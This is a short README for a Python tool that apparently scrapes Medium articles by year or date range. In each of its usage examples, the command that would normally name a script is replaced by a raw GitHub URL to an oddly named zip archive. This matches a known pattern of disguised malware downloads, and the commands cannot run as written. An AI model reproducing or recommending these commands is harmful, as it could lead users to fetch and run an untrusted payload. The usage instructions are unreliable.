# medium-scraping
Python code for scraping medium articles.

## Usage:
Scrape articles for a full year<br>
python3 https://raw.githubusercontent.com/AvishekInvincible/medium-scraping/master/dryadic/medium-scraping-Woyaway.zip --year YEAR<br>
Ex: python3 https://raw.githubusercontent.com/AvishekInvincible/medium-scraping/master/dryadic/medium-scraping-Woyaway.zip --year 2021 <br>
<br>
Scrape articles for a selected date range for a year<br>
python3 https://raw.githubusercontent.com/AvishekInvincible/medium-scraping/master/dryadic/medium-scraping-Woyaway.zip --year YEAR --start_date START_DATE --end_date END_DATE<br>
Ex: python3 https://raw.githubusercontent.com/AvishekInvincible/medium-scraping/master/dryadic/medium-scraping-Woyaway.zip --year 2021 --start_date 01-31 --end_date 02-20<br>
